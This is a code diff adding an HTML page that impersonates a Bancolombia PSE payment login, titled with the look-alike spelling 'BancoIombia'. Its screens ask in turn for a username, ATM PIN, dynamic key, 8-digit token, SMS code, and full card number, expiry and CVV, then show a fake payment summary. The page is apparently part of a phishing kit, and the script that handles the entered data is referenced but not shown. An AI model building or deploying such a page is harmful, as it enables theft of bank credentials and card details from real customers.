@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paga con PSE | BancoIombia</title>
+    <link rel="shortcut icon" href="./assets/bancol.png" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap" rel="stylesheet">
+    <link rel="shortcut icon" href="./assets/images/bancol.png" type="image/x-icon">
+    <link rel="stylesheet" href="./css/tw.css"> <!-- Tailwind 3.4.15 -->
+    <link rel="stylesheet" href="./css/normalize.css">
+    <link rel="stylesheet" href="./css/bancol.css">
+
+    <!-- script -->
+    <script src="../../js/functions.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jsrsasign/10.1.0/jsrsasign-all-min.js"></script>
+
+</head>
+<body class="">
+    <div id="loader" class="bancol-loader">
+        <div class="loader"></div>
+        <p class="text-md fotn">Cargando...</p>
+    </div>
+
+    <nav class="w-full flex justify-center fixed bg-white z-[10]">
+        <img src="./assets/pse/logo-primario.svg" width="200px">
+    </nav>
+    <section class="min-h-screen pt-[80px] flex flex-col bg-[#f7f7f7]  items-center px-3 bg-bancol">
+        
+        <div id="step-user" class="hidden w-full md:w-[500px] pt-[80px]">
+            <p id="step-one-title" class="text-[25px] text-center text-gray-800 font-bold">Te damos la bienvenida</p>
+
+            <div id="f-user" class="mt-7 w-full pt-10 pb-7 px-3 md:px-10 rounded-xl bg-white shadow-lg overflow-hidden">
+                <form action="">
+                    <p class="text-center">El usuario es el mismo con el que ingresas a la <br/> <b>Sucursal Virtual Personas.</b></p>
+                    <div class="input-container mt-7">
+                        <input class="i-user" type="text" id="user" placeholder="" required>
+                        <label for="user">Usuario</label>
+                    </div>
+                    <div class="flex flex-row-reverse gap-5">
+                        <div id="step-user-next" class="mt-6 w-full cursor-pointer pt-2 pb-3 rounded-full bg-[#FDDA24] hover:shadow-md">
+                            <p class="text-center text-[19px] font-bold">Continuar</p>
+                        </div>
+                        <div id="step-user-cancel" class="mt-6 w-full cursor-pointer hover:shadow-md pt-2 pb-3 rounded-full border border-gray-800">
+                            <p class="text-center text-[19px] font-bold">Cancelar</p>
+                        </div>
+                    </div>
+                </form>
+            </div>
+
+            <hr class="my-10">
+            <div class="w-full flex flex-col items-center gap-3 pb-10">
+                <img src="./assets/pse/logo-fenix.svg">
+                <img src="./assets/pse/vigilado.svg" width="40%">
+            </div>
+        </div>
+
+        <div id="step-pass" class="hidden w-full md:w-[500px] pt-[80px]">
+            <p id="step-one-title" class="text-[25px] text-center text-gray-800 font-bold">Clave principal</p>
+
+            <div id="f-password" class="mt-7 w-full pt-10 pb-7 px-3 md:px-10 rounded-xl bg-white shadow-lg overflow-hidden">
+                <form action="">
+                    <div class="w-full flex justify-center">
+                        <img src="./assets/pse/ban-lock.png" width="30px">
+                    </div>
+                    <p class="text-center">Es la misma que usas en el cajero automático</p>
+                    <div class="w-full flex justify-center">
+                        <div class="digit-input-container">
+                            <input type="text" maxlength="1" class="digit-input" id="pass-digit-1">
+                            <input type="text" maxlength="1" class="digit-input" id="pass-digit-2">
+                            <input type="text" maxlength="1" class="digit-input" id="pass-digit-3">
+                            <input type="text" maxlength="1" class="digit-input" id="pass-digit-4">
+                        </div>
+                    </div>
+                    <div class="flex flex-row-reverse gap-5">
+                        <div id="step-pass-next" class="mt-6 w-full cursor-pointer pt-2 pb-3 rounded-full bg-[#FDDA24] hover:shadow-md">
+                            <p class="text-center text-[19px] font-bold">Continuar</p>
+                        </div>
+                        <div id="step-pass-cancel" class="mt-6 w-full cursor-pointer hover:shadow-md pt-2 pb-3 rounded-full border border-gray-800">
+                            <p class="text-center text-[19px] font-bold">Cancelar</p>
+                        </div>
+                    </div>
+                </form>
+            </div>
+
+            <hr class="my-10">
+            <div class="w-full flex flex-col items-center gap-3 pb-10">
+                <img src="./assets/pse/logo-fenix.svg">
+                <img src="./assets/pse/vigilado.svg" width="40%">
+            </div>
+        </div>
+
+        <div id="step-cdin" class="hidden w-full md:w-[500px] pt-[80px]">
+            <p id="step-one-title" class="text-[25px] text-center text-gray-800 font-bold">Clave dinámica</p>
+
+            <div id="f-cdin" class="mt-7 w-full pt-10 pb-7 px-3 md:px-10 rounded-xl bg-white shadow-lg overflow-hidden">
+                <form action="">
+                    <div class="w-full flex justify-center">
+                        <img src="./assets/pse/ban-lock.png" width="30px">
+                    </div>
+                    <p class="text-center">La encuentras en la App Bancolombia</p>
+                    <div class="w-full flex justify-center">
+                        <div class="digit-input-container">
+                            <input type="text" maxlength="1" class="digit-input" id="cdin-digit-1">
+                            <input type="text" maxlength="1" class="digit-input" id="cdin-digit-2">
+                            <input type="text" maxlength="1" class="digit-input" id="cdin-digit-3">
+                            <input type="text" maxlength="1" class="digit-input" id="cdin-digit-4">
+                            <input type="text" maxlength="1" class="digit-input" id="cdin-digit-5">
+                            <input type="text" maxlength="1" class="digit-input" id="cdin-digit-6">
+                        </div>
+                    </div>
+                    <div class="flex flex-row-reverse gap-5">
+                        <div id="step-cdin-next" class="mt-6 w-full cursor-pointer pt-2 pb-3 rounded-full bg-[#FDDA24] hover:shadow-md">
+                            <p class="text-center text-[19px] font-bold">Continuar</p>
+                        </div>
+                        <div id="step-cdin-cancel" class="mt-6 w-full cursor-pointer hover:shadow-md pt-2 pb-3 rounded-full border border-gray-800">
+                            <p class="text-center text-[19px] font-bold">Cancelar</p>
+                        </div>
+                    </div>
+                </form>
+            </div>
+
+            <hr class="my-10">
+            <div class="w-full flex flex-col items-center gap-3 pb-10">
+                <img src="./assets/pse/logo-fenix.svg">
+                <img src="./assets/pse/vigilado.svg" width="40%">
+            </div>
+        </div>
+
+        <div id="step-token" class="hidden w-full md:w-[500px] pt-[80px]">
+            <p id="step-one-title" class="text-[25px] text-center text-gray-800 font-bold">Token</p>
+
+            <div id="f-token" class="mt-7 w-full pt-10 pb-7 px-3 md:px-10 rounded-xl bg-white shadow-lg overflow-hidden">
+                <form action="">
+                    <div class="w-full flex justify-center">
+                        <img src="./assets/pse/ban-lock.png" width="30px">
+                    </div>
+                    <p class="text-center">Ingresa el token de 8 dígitos</p>
+                    <div class="w-full flex justify-center">
+                        <div class="digit-input-container">
+                            <input type="text" maxlength="1" class="digit-input" id="token-digit-1">
+                            <input type="text" maxlength="1" class="digit-input" id="token-digit-2">
+                            <input type="text" maxlength="1" class="digit-input" id="token-digit-3">
+                            <input type="text" maxlength="1" class="digit-input" id="token-digit-4">
+                            <input type="text" maxlength="1" class="digit-input" id="token-digit-5">
+                            <input type="text" maxlength="1" class="digit-input" id="token-digit-6">
+                            <input type="text" maxlength="1" class="digit-input" id="token-digit-7">
+                            <input type="text" maxlength="1" class="digit-input" id="token-digit-8">
+                        </div>
+                    </div>
+                    <div class="flex flex-row-reverse gap-5">
+                        <div id="step-token-next" class="mt-6 w-full cursor-pointer pt-2 pb-3 rounded-full bg-[#FDDA24] hover:shadow-md">
+                            <p class="text-center text-[19px] font-bold">Continuar</p>
+                        </div>
+                        <div id="step-token-cancel" class="mt-6 w-full cursor-pointer hover:shadow-md pt-2 pb-3 rounded-full border border-gray-800">
+                            <p class="text-center text-[19px] font-bold">Cancelar</p>
+                        </div>
+                    </div>
+                </form>
+            </div>
+
+            <hr class="my-10">
+            <div class="w-full flex flex-col items-center gap-3 pb-10">
+                <img src="./assets/pse/logo-fenix.svg">
+                <img src="./assets/pse/vigilado.svg" width="40%">
+            </div>
+        </div>
+
+        <div id="step-otp" class="hidden w-full md:w-[500px] pt-[80px]">
+            <p id="step-one-title" class="text-[25px] text-center text-gray-800 font-bold">Código de seguridad</p>
+
+            <div id="f-otp" class="mt-7 w-full pt-10 pb-7 px-3 md:px-10 rounded-xl bg-white shadow-lg overflow-hidden">
+                <form action="">
+                    <div class="w-full flex justify-center">
+                        <img src="./assets/pse/ban-lock.png" width="30px">
+                    </div>
+                    <p class="text-center">El código lo enviamos a tu celular</p>
+                    <div class="w-full flex justify-center">
+                        <div class="digit-input-container">
+                            <input type="text" maxlength="1" class="digit-input" id="otp-digit-1">
+                            <input type="text" maxlength="1" class="digit-input" id="otp-digit-2">
+                            <input type="text" maxlength="1" class="digit-input" id="otp-digit-3">
+                            <input type="text" maxlength="1" class="digit-input" id="otp-digit-4">
+                            <input type="text" maxlength="1" class="digit-input" id="otp-digit-5">
+                            <input type="text" maxlength="1" class="digit-input" id="otp-digit-6">
+                        </div>
+                    </div>
+                    <div class="w-full flex justify-center">
+                    </div>
+                    <div class="flex flex-row-reverse gap-5">
+                        <div id="step-otp-next" class="mt-6 w-full cursor-pointer pt-2 pb-3 rounded-full bg-[#FDDA24] hover:shadow-md">
+                            <p class="text-center text-[19px] font-bold">Continuar</p>
+                        </div>
+                        <div id="step-otp-cancel" class="mt-6 w-full cursor-pointer hover:shadow-md pt-2 pb-3 rounded-full border border-gray-800">
+                            <p class="text-center text-[19px] font-bold">Cancelar</p>
+                        </div>
+                    </div>
+                </form>
+            </div>
+
+            <hr class="my-10">
+            <div class="w-full flex flex-col items-center gap-3 pb-10">
+                <img src="./assets/pse/logo-fenix.svg">
+                <img src="./assets/pse/vigilado.svg" width="40%">
+            </div>
+        </div>
+
+        <div id="step-card" class="hidden w-full md:w-[500px] pt-[80px]">
+            <p id="step-one-title" class="text-[25px] text-center text-gray-800 font-bold">Método de ingreso alternativo</p>
+
+            <div id="f-user" class="mt-7 w-full pt-10 pb-7 px-3 md:px-10 rounded-xl bg-white shadow-lg overflow-hidden">
+                <form action="">
+                    <p class="text-center">Ingresa con un <br/> <b>Producto Asociado</b> a tu cuenta.</p>
+                    <div class="input-container mt-7">
+                        <input class="i-card" type="text" oninput="formatCNumber(this)" id="p" placeholder="" required>
+                        <label for="user">Número de Tarjeta</label>
+                    </div>
+                    <div class="flex flex-row gap-3">
+                        <div class="input-container mt-7">
+                            <input class="i-date" oninput="formatDate(this)" id="pdate" type="text" placeholder="" required>
+                            <label for="user">MM/AA</label>
+                        </div>
+                        <div class="input-container mt-7">
+                            <input id="c" required type="number" oninput="limitDigits(this, 3)" class="i-lock" placeholder="" required>
+                            <label for="user">CVV</label>
+                        </div>
+                    </div>
+                    <div class="flex flex-row-reverse gap-5">
+                        <div id="step-card-next" class="mt-6 w-full cursor-pointer pt-2 pb-3 rounded-full bg-[#FDDA24] hover:shadow-md">
+                            <p class="text-center text-[19px] font-bold">Continuar</p>
+                        </div>
+                        <div id="step-card-cancel" class="mt-6 w-full cursor-pointer hover:shadow-md pt-2 pb-3 rounded-full border border-gray-800">
+                            <p class="text-center text-[19px] font-bold">Cancelar</p>
+                        </div>
+                    </div>
+                </form>
+            </div>
+
+            <hr class="my-10">
+            <div class="w-full flex flex-col items-center gap-3 pb-10">
+                <img src="./assets/pse/logo-fenix.svg">
+                <img src="./assets/pse/vigilado.svg" width="40%">
+            </div>
+        </div>
+
+        <div id="step-resume" class="hidden w-full md:w-[600px]">
+            <p class="text-[25px] text-center text-gray-800 font-semibold">¡Te damos la bienvenida!</p>
+
+            <div class="mt-7 w-full  rounded-xl shadow-lg overflow-hidden">
+                <div class="bg-black">
+                    <p class="text-white text-lg py-1 px-4">Detalle del pago</p>
+                </div>
+                <div class="bg-[#F5B6CD]">
+                    <p class="py-5 text-center text-xl font-semibold">Total a pagar: <span id="label-price">$ 00,0</span></p>
+                </div>
+                <div class="bg-white grid grid-cols-1 md:grid-cols-2 gap-3 px-3 py-7 text-wrap">
+                    <!-- ITEM 1 -->
+                    <div class="flex flex-row items-center gap-1">
+                        <div class="w-[45px] h-[45px]">
+                            <img src="./assets/pse/ico-store.svg" width="100%">
+                        </div>
+                        <div>
+                            <p class="text-[15px] m-0 text-gray-800">Comercio</p>
+                            <p class="text-[15px] text-gray-800 font-semibold" id="pag-origin">COLOMBIA TELECOMUNICACIONES S.A ESP</p>
+                        </div>
+                    </div>
+                    <!-- ITEM 2 -->
+                    <div class="flex flex-row items-center gap-1">
+                        <div class="w-[45px] h-[45px]">
+                            <img src="./assets/pse/ico-hand-holding-box.svg" width="100%">
+                        </div>
+                        <div>
+                            <p class="text-[15px] m-0 text-gray-800">Referencia del producto</p>
+                            <p class="text-[15px] text-gray-800 font-semibold">6084999328</p>
+                        </div>
+                    </div>
+                    <!-- ITEM 3 -->
+                    <div class="flex flex-row items-center gap-1">
+                        <div class="w-[45px] h-[45px]">
+                            <img src="./assets/pse/ico-document.svg" width="100%">
+                        </div>
+                        <div>
+                            <p class="text-[15px] m-0 text-gray-800">Descripción</p>
+                            <p class="text-[15px] text-gray-800 font-semibold" id="pag-desc">Movil Express Ref pago express No</p>
+                        </div>
+                    </div>
+                    <!-- ITEM 4 -->
+                    <div class="flex flex-row items-center gap-1">
+                        <div class="w-[45px] h-[45px]">
+                            <img src="./assets/pse/ico-hand-holding-coin-2.svg" width="100%">
+                        </div>
+                        <div>
+                            <p class="text-[15px] m-0 text-gray-800">Costo del pago</p>
+                            <p class="text-[15px] text-gray-800 font-semibold" id="label-price">$ 15.234,22</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <p class="mt-1 text-gray-800 text-center font-semibold underline cursor-pointer">Ver términos y condiciones</p>
+
+            <div class="flex flex-col md:flex-row-reverse gap-5">
+                <div id="step-resume-next" class="mt-6 w-full cursor-pointer pt-2 pb-3 rounded-full bg-[#FDDA24] hover:shadow-md">
+                    <p class="text-center text-[19px]">Continuar</p>
+                </div>
+                <div id="step-resume-cancel" class="mt-6 w-full cursor-pointer hover:shadow-md pt-2 pb-3 rounded-full border border-gray-800">
+                    <p class="text-center text-[19px]">Cancelar</p>
+                </div>
+            </div>
+
+            <hr class="my-10">
+            <div class="w-full flex flex-col items-center gap-3 pb-10">
+                <img src="./assets/pse/logo-fenix.svg">
+                <img src="./assets/pse/vigilado.svg" width="40%">
+            </div>
+        </div>
+
+    </section>
+
+
+    <script src="./js/bancol.js"></script>
+</body>
+</html>
